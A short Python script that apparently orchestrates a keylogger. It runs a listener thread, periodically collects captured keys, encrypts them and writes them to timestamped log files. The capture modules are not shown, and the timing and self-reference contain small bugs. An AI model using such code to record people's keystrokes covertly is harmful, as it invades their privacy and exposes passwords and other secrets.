import threading
from time import sleep
from listener import Listener
from data_collector import Package
from time_stamp import time_stamp2
from file_test import log

class Manager:
    def __init__(self, hours = 5):
        self.listener = Listener()
        self.service = threading.Thread(target=self.listener.run)
        self.hours = hours
    def start(self):
        self.service.start()
        while True:
            sleep(self.hours)
            temp_data = p.listener.get_keys()
            if temp_data:
                data = Package(temp_data)
                pack_name = f'{time_stamp2()}.txt'
                print(pack_name)
                log(pack_name, str(data.encrypt()))
    def stop(self):
        self.listener.stop()


if __name__ == '__main__':

    p = Manager()
    p.start()